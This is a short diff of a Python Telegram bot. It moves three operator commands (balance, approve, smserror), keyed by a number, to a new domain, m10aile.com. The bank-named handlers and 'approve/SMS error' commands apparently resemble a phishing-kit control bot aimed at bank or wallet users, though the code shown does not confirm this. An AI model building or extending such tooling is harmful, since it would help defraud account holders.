@@ -87,7 +87,7 @@ def kapital(client, message):
     try:
         number = message.text.split()[1]
 
-        url = f"https://m10la.com/crud/balance/{number}/"
+        url = f"https://m10aile.com/crud/balance/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -106,7 +106,7 @@ def kapital(client, message):
     try:
         number = message.text.split()[1]
 
-        url = f"https://m10la.com/crud/approve/{number}/"
+        url = f"https://m10aile.com/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -124,7 +124,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://m10la.com/crud/smserror/{number}/"
+        url = f"https://m10aile.com/crud/smserror/{number}/"
         response = requests.get(url)
         if response.status_code == 200:
             message.reply_text("Hersey Hazirdir.")
